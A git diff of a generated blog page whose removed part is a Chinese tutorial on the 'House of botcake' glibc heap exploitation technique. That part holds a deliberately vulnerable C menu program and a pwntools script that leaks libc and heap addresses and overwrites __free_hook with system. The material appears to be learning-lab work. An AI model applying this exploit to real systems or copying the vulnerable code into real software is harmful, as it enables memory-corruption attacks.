@@ -1,18 +1,34 @@
 <!DOCTYPE html>
 <html lang="zh-cn" dir="ltr">
     <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset='utf-8'>
-<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="https://blog.csdn.net/Mr_Fmnwon/article/details/142468380\nHouse of botcake 是利用unsortedbin绕过tcache检查从而实现double free的一种手法\n利用手法\n1 malloc 9个相同tcache大小的chunk0-8\n">
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="">
 <title></title>
 
 <link rel='canonical' href='http://localhost:1313/p/'>
 
-<link rel="stylesheet" href="/scss/style.min.84466b97fc2839f50008967839ac7e52db98eefba6b8d2a771a97db8f36059e7.css"><meta property='og:title' content="">
-<meta property='og:description' content="https://blog.csdn.net/Mr_Fmnwon/article/details/142468380\nHouse of botcake 是利用unsortedbin绕过tcache检查从而实现double free的一种手法\n利用手法\n1 malloc 9个相同tcache大小的chunk0-8\n">
+<link rel="stylesheet" href="/scss/style.min.f29951529384267183dbb2bb71dfebce8cf9e242ddf6b2d967676156070babed.css"><meta property='og:title' content="">
+<meta property='og:description' content="">
 <meta property='og:url' content='http://localhost:1313/p/'>
-<meta property='og:site_name' content='fuguang&#39;s storys'>
+<meta property='og:site_name' content='FuGuang&#39;s Bolg'>
 <meta property='og:type' content='article'><meta property='article:section' content='Post' />
 <meta name="twitter:title" content="">
-<meta name="twitter:description" content="https://blog.csdn.net/Mr_Fmnwon/article/details/142468380\nHouse of botcake 是利用unsortedbin绕过tcache检查从而实现double free的一种手法\n利用手法\n1 malloc 9个相同tcache大小的chunk0-8\n">
+<meta name="twitter:description" content=""><style>
+    :root {
+        --article-font-family: "Noto Serif SC", var(--base-font-family);
+    }
+</style>
+<script>  
+		(function () {
+		    const customFont = document.createElement('link');
+		    customFont.href = "https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@400;700&display=swap";
+		
+		    customFont.type = "text/css";
+		    customFont.rel = "stylesheet";
+		
+		    document.head.appendChild(customFont);
+		}());
+</script>
+
     </head>
     <body class="
     article-page
@@ -69,8 +85,8 @@
         
         
         <div class="site-meta">
-            <h1 class="site-name"><a href="/">fuguang&#39;s storys</a></h1>
-            <h2 class="site-description">Welcome ~</h2>
+            <h1 class="site-name"><a href="/">FuGuang&#39;s Bolg</a></h1>
+            <h2 class="site-description">向左向右但别退后</h2>
         </div>
     </header><ol class="menu-social">
             
@@ -223,38 +239,7 @@
     </ol>
 </aside>
 
-    <aside class="sidebar right-sidebar sticky">
-        
-            
-                
-    <section class="widget archives">
-        <div class="widget-icon">
-            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
-  <path stroke="none" d="M0 0h24v24H0z"/>
-  <line x1="5" y1="9" x2="19" y2="9" />
-  <line x1="5" y1="15" x2="19" y2="15" />
-  <line x1="11" y1="4" x2="7" y2="20" />
-  <line x1="17" y1="4" x2="13" y2="20" />
-</svg>
-
-
-
-        </div>
-        <h2 class="widget-title section-title">目录</h2>
-        
-        <div class="widget--toc">
-            <nav id="TableOfContents">
-  <ol>
-    <li><a href="#demoglibc231">demo（glibc2.31）</a></li>
-  </ol>
-</nav>
-        </div>
-    </section>
-
-            
-        
-    </aside>
-
+    
 
             <main class="main full-width">
     <article class="main-article">
@@ -284,341 +269,7 @@
     <section class="article-content">
     
     
-    <p><a class="link" href="https://blog.csdn.net/Mr_Fmnwon/article/details/142468380"  target="_blank" rel="noopener"
-    >https://blog.csdn.net/Mr_Fmnwon/article/details/142468380</a></p>
-<p>House of botcake 是利用unsortedbin绕过tcache检查从而实现double free的一种手法</p>
-<p>利用手法</p>
-<p>1 malloc 9个相同tcache大小的chunk0-8</p>
-<p>2 free7个chunk填满tcache(0-6)</p>
-<p>3 free(8)进入 unsortedbin,free(7)与chunk8合并</p>
-<p>4malloc一个在tcatche里空出一个位置</p>
-<p>5再次free（8），由于第一次free8进入unsortedbin,没有tcache_key,所以本次free8进入tcache</p>
-<p>这样chunk8就成为了overlap_chunk</p>
-<h2 id="demoglibc231">demo（glibc2.31）
-</h2><p>参考<a class="link" href="https://blog.csdn.net/Mr_Fmnwon/article/details/142468380"  target="_blank" rel="noopener"
-    >https://blog.csdn.net/Mr_Fmnwon/article/details/142468380</a></p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span><span class="lnt">14
-</span><span class="lnt">15
-</span><span class="lnt">16
-</span><span class="lnt">17
-</span><span class="lnt">18
-</span><span class="lnt">19
-</span><span class="lnt">20
-</span><span class="lnt">21
-</span><span class="lnt">22
-</span><span class="lnt">23
-</span><span class="lnt">24
-</span><span class="lnt">25
-</span><span class="lnt">26
-</span><span class="lnt">27
-</span><span class="lnt">28
-</span><span class="lnt">29
-</span><span class="lnt">30
-</span><span class="lnt">31
-</span><span class="lnt">32
-</span><span class="lnt">33
-</span><span class="lnt">34
-</span><span class="lnt">35
-</span><span class="lnt">36
-</span><span class="lnt">37
-</span><span class="lnt">38
-</span><span class="lnt">39
-</span><span class="lnt">40
-</span><span class="lnt">41
-</span><span class="lnt">42
-</span><span class="lnt">43
-</span><span class="lnt">44
-</span><span class="lnt">45
-</span><span class="lnt">46
-</span><span class="lnt">47
-</span><span class="lnt">48
-</span><span class="lnt">49
-</span><span class="lnt">50
-</span><span class="lnt">51
-</span><span class="lnt">52
-</span><span class="lnt">53
-</span><span class="lnt">54
-</span><span class="lnt">55
-</span><span class="lnt">56
-</span><span class="lnt">57
-</span><span class="lnt">58
-</span><span class="lnt">59
-</span><span class="lnt">60
-</span><span class="lnt">61
-</span><span class="lnt">62
-</span><span class="lnt">63
-</span><span class="lnt">64
-</span><span class="lnt">65
-</span><span class="lnt">66
-</span><span class="lnt">67
-</span><span class="lnt">68
-</span><span class="lnt">69
-</span><span class="lnt">70
-</span><span class="lnt">71
-</span><span class="lnt">72
-</span><span class="lnt">73
-</span><span class="lnt">74
-</span><span class="lnt">75
-</span><span class="lnt">76
-</span><span class="lnt">77
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1">#include&lt;stdlib.h&gt;</span>
-</span></span><span class="line"><span class="cl"><span class="c1">#include &lt;stdio.h&gt;</span>
-</span></span><span class="line"><span class="cl"><span class="c1">#include &lt;unistd.h&gt;</span>
-</span></span><span class="line"><span class="cl"> 
-</span></span><span class="line"><span class="cl"><span class="n">char</span> <span class="o">*</span><span class="n">chunk_list</span><span class="p">[</span><span class="mh">0x100</span><span class="p">];</span>
-</span></span><span class="line"><span class="cl"> 
-</span></span><span class="line"><span class="cl"><span class="n">void</span> <span class="n">menu</span><span class="p">()</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">    <span class="n">puts</span><span class="p">(</span><span class="s2">&#34;1. add chunk&#34;</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">    <span class="n">puts</span><span class="p">(</span><span class="s2">&#34;2. delete chunk&#34;</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">    <span class="n">puts</span><span class="p">(</span><span class="s2">&#34;3. edit chunk&#34;</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">    <span class="n">puts</span><span class="p">(</span><span class="s2">&#34;4. show chunk&#34;</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">    <span class="n">puts</span><span class="p">(</span><span class="s2">&#34;5. exit&#34;</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">    <span class="n">puts</span><span class="p">(</span><span class="s2">&#34;choice:&#34;</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl"><span class="p">}</span>
-</span></span><span class="line"><span class="cl"> 
-</span></span><span class="line"><span class="cl"><span class="nb">int</span> <span class="n">get_num</span><span class="p">()</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">    <span class="n">char</span> <span class="n">buf</span><span class="p">[</span><span class="mh">0x10</span><span class="p">];</span>
-</span></span><span class="line"><span class="cl">    <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="n">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">));</span>
-</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">atoi</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl"><span class="p">}</span>
-</span></span><span class="line"><span class="cl"> 
-</span></span><span class="line"><span class="cl"><span class="n">void</span> <span class="n">add_chunk</span><span class="p">()</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">    <span class="n">puts</span><span class="p">(</span><span class="s2">&#34;index:&#34;</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">    <span class="nb">int</span> <span class="n">index</span> <span class="o">=</span> <span class="n">get_num</span><span class="p">();</span>
-</span></span><span class="line"><span class="cl">    <span class="n">puts</span><span class="p">(</span><span class="s2">&#34;size:&#34;</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">    <span class="nb">int</span> <span class="n">size</span> <span class="o">=</span> <span class="n">get_num</span><span class="p">();</span>
-</span></span><span class="line"><span class="cl">    <span class="n">chunk_list</span><span class="p">[</span><span class="n">index</span><span class="p">]</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="n">size</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl"><span class="p">}</span>
-</span></span><span class="line"><span class="cl"> 
-</span></span><span class="line"><span class="cl"><span class="n">void</span> <span class="n">delete_chunk</span><span class="p">()</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">    <span class="n">puts</span><span class="p">(</span><span class="s2">&#34;index:&#34;</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">    <span class="nb">int</span> <span class="n">index</span> <span class="o">=</span> <span class="n">get_num</span><span class="p">();</span>
-</span></span><span class="line"><span class="cl">    <span class="n">free</span><span class="p">(</span><span class="n">chunk_list</span><span class="p">[</span><span class="n">index</span><span class="p">]);</span>
-</span></span><span class="line"><span class="cl"><span class="p">}</span>
-</span></span><span class="line"><span class="cl"> 
-</span></span><span class="line"><span class="cl"><span class="n">void</span> <span class="n">edit_chunk</span><span class="p">()</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">    <span class="n">puts</span><span class="p">(</span><span class="s2">&#34;index:&#34;</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">    <span class="nb">int</span> <span class="n">index</span> <span class="o">=</span> <span class="n">get_num</span><span class="p">();</span>
-</span></span><span class="line"><span class="cl">    <span class="n">puts</span><span class="p">(</span><span class="s2">&#34;length:&#34;</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">    <span class="nb">int</span> <span class="n">length</span> <span class="o">=</span> <span class="n">get_num</span><span class="p">();</span>
-</span></span><span class="line"><span class="cl">    <span class="n">puts</span><span class="p">(</span><span class="s2">&#34;content:&#34;</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">    <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">chunk_list</span><span class="p">[</span><span class="n">index</span><span class="p">],</span> <span class="n">length</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl"><span class="p">}</span>
-</span></span><span class="line"><span class="cl"> 
-</span></span><span class="line"><span class="cl"><span class="n">void</span> <span class="n">show_chunk</span><span class="p">()</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">    <span class="n">puts</span><span class="p">(</span><span class="s2">&#34;index:&#34;</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">    <span class="nb">int</span> <span class="n">index</span> <span class="o">=</span> <span class="n">get_num</span><span class="p">();</span>
-</span></span><span class="line"><span class="cl">    <span class="n">puts</span><span class="p">(</span><span class="n">chunk_list</span><span class="p">[</span><span class="n">index</span><span class="p">]);</span>
-</span></span><span class="line"><span class="cl"><span class="p">}</span>
-</span></span><span class="line"><span class="cl"> 
-</span></span><span class="line"><span class="cl"><span class="nb">int</span> <span class="n">main</span><span class="p">()</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">    <span class="n">setbuf</span><span class="p">(</span><span class="n">stdin</span><span class="p">,</span> <span class="n">NULL</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">    <span class="n">setbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="n">NULL</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">    <span class="n">setbuf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="n">NULL</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl"> 
-</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">        <span class="n">menu</span><span class="p">();</span>
-</span></span><span class="line"><span class="cl">        <span class="n">switch</span> <span class="p">(</span><span class="n">get_num</span><span class="p">())</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">            <span class="k">case</span> <span class="mi">1</span><span class="p">:</span>
-</span></span><span class="line"><span class="cl">                <span class="n">add_chunk</span><span class="p">();</span>
-</span></span><span class="line"><span class="cl">                <span class="k">break</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">            <span class="k">case</span> <span class="mi">2</span><span class="p">:</span>
-</span></span><span class="line"><span class="cl">                <span class="n">delete_chunk</span><span class="p">();</span>
-</span></span><span class="line"><span class="cl">                <span class="k">break</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">            <span class="k">case</span> <span class="mi">3</span><span class="p">:</span>
-</span></span><span class="line"><span class="cl">                <span class="n">edit_chunk</span><span class="p">();</span>
-</span></span><span class="line"><span class="cl">                <span class="k">break</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">            <span class="k">case</span> <span class="mi">4</span><span class="p">:</span>
-</span></span><span class="line"><span class="cl">                <span class="n">show_chunk</span><span class="p">();</span>
-</span></span><span class="line"><span class="cl">                <span class="k">break</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">            <span class="k">case</span> <span class="mi">5</span><span class="p">:</span>
-</span></span><span class="line"><span class="cl">                <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">            <span class="n">default</span><span class="p">:</span>
-</span></span><span class="line"><span class="cl">                <span class="n">puts</span><span class="p">(</span><span class="s2">&#34;invalid choice.&#34;</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">        <span class="p">}</span>
-</span></span><span class="line"><span class="cl">    <span class="p">}</span>
-</span></span><span class="line"><span class="cl"><span class="p">}</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p><strong>exp</strong></p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span><span class="lnt">14
-</span><span class="lnt">15
-</span><span class="lnt">16
-</span><span class="lnt">17
-</span><span class="lnt">18
-</span><span class="lnt">19
-</span><span class="lnt">20
-</span><span class="lnt">21
-</span><span class="lnt">22
-</span><span class="lnt">23
-</span><span class="lnt">24
-</span><span class="lnt">25
-</span><span class="lnt">26
-</span><span class="lnt">27
-</span><span class="lnt">28
-</span><span class="lnt">29
-</span><span class="lnt">30
-</span><span class="lnt">31
-</span><span class="lnt">32
-</span><span class="lnt">33
-</span><span class="lnt">34
-</span><span class="lnt">35
-</span><span class="lnt">36
-</span><span class="lnt">37
-</span><span class="lnt">38
-</span><span class="lnt">39
-</span><span class="lnt">40
-</span><span class="lnt">41
-</span><span class="lnt">42
-</span><span class="lnt">43
-</span><span class="lnt">44
-</span><span class="lnt">45
-</span><span class="lnt">46
-</span><span class="lnt">47
-</span><span class="lnt">48
-</span><span class="lnt">49
-</span><span class="lnt">50
-</span><span class="lnt">51
-</span><span class="lnt">52
-</span><span class="lnt">53
-</span><span class="lnt">54
-</span><span class="lnt">55
-</span><span class="lnt">56
-</span><span class="lnt">57
-</span><span class="lnt">58
-</span><span class="lnt">59
-</span><span class="lnt">60
-</span><span class="lnt">61
-</span><span class="lnt">62
-</span><span class="lnt">63
-</span><span class="lnt">64
-</span><span class="lnt">65
-</span><span class="lnt">66
-</span><span class="lnt">67
-</span><span class="lnt">68
-</span><span class="lnt">69
-</span><span class="lnt">70
-</span><span class="lnt">71
-</span><span class="lnt">72
-</span><span class="lnt">73
-</span><span class="lnt">74
-</span><span class="lnt">75
-</span><span class="lnt">76
-</span><span class="lnt">77
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
-</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">=</span><span class="n">process</span><span class="p">(</span><span class="s1">&#39;./botcake231&#39;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="n">libc</span><span class="o">=</span><span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;/home/fuguang/glibc-all-in-one/libs/2.31-0ubuntu9.18_amd64/libc.so.6&#39;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">log_level</span><span class="o">=</span><span class="s1">&#39;debug&#39;</span>
-</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">arch</span><span class="o">=</span><span class="s1">&#39;amd64&#39;</span>
-</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">menu</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
-</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;choice:&#39;</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
-</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">add</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span><span class="n">size</span><span class="p">):</span>
-</span></span><span class="line"><span class="cl">    <span class="n">menu</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;index:&#39;</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
-</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;size:&#39;</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>
-</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">edit</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span><span class="n">content</span><span class="p">):</span>
-</span></span><span class="line"><span class="cl">    <span class="n">menu</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;index:&#39;</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
-</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;length:&#39;</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">content</span><span class="p">)))</span>
-</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;content:&#39;</span><span class="p">,</span><span class="n">content</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">show</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
-</span></span><span class="line"><span class="cl">    <span class="n">menu</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;index:&#39;</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
-</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">dele</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
-</span></span><span class="line"><span class="cl">    <span class="n">menu</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;index:&#39;</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
-</span></span><span class="line"><span class="cl"><span class="c1">#leak libc 并清除所有chunk</span>
-</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mh">0x410</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mh">0x410</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="n">dele</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="n">show</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="n">libcbase</span><span class="o">=</span><span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span><span class="o">-</span><span class="mh">0x21ace0</span><span class="o">+</span><span class="mh">0x2e100</span>
-</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">libcbase</span><span class="p">))</span>
-</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mh">0x410</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="n">dele</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="n">dele</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="c1">#利用largebin leak heap 并清除所有chunk</span>
-</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mh">0x410</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mh">0x410</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span><span class="mh">0x410</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span><span class="mh">0x410</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="n">dele</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="n">dele</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="n">show</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="n">heapbase</span><span class="o">=</span><span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span><span class="o">-</span><span class="mh">0x290</span>
-</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">heapbase</span><span class="p">))</span>
-</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mh">0x410</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span><span class="mh">0x410</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="c1">#botcake</span>
-</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">4</span><span class="p">):</span>
-</span></span><span class="line"><span class="cl">    <span class="n">dele</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">9</span><span class="p">):</span>
-</span></span><span class="line"><span class="cl">    <span class="n">add</span><span class="p">(</span><span class="n">i</span><span class="p">,</span><span class="mh">0x80</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mi">9</span><span class="p">,</span><span class="mh">0x10</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">7</span><span class="p">):</span>
-</span></span><span class="line"><span class="cl">    <span class="n">dele</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="n">dele</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="n">dele</span><span class="p">(</span><span class="mi">7</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mi">10</span><span class="p">,</span><span class="mh">0x80</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="n">dele</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mi">11</span><span class="p">,</span><span class="mh">0xb0</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="n">freehook</span><span class="o">=</span><span class="n">libcbase</span><span class="o">+</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;__free_hook&#39;</span><span class="p">]</span><span class="o">-</span><span class="mi">8</span>
-</span></span><span class="line"><span class="cl"><span class="n">heap</span><span class="o">=</span><span class="n">heapbase</span><span class="o">+</span><span class="mh">0x720</span>
-</span></span><span class="line"><span class="cl"><span class="n">xored</span><span class="o">=</span><span class="p">(</span><span class="n">heap</span><span class="o">&gt;&gt;</span><span class="mi">12</span><span class="p">)</span><span class="o">^</span><span class="n">freehook</span>
-</span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="mi">11</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x88</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x91</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">freehook</span><span class="p">))</span>
-</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mh">0x80</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mh">0x80</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="n">sys</span><span class="o">=</span><span class="n">libcbase</span><span class="o">+</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">]</span>
-</span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">sys</span><span class="p">))</span>
-</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mh">0x8</span><span class="p">)</span>
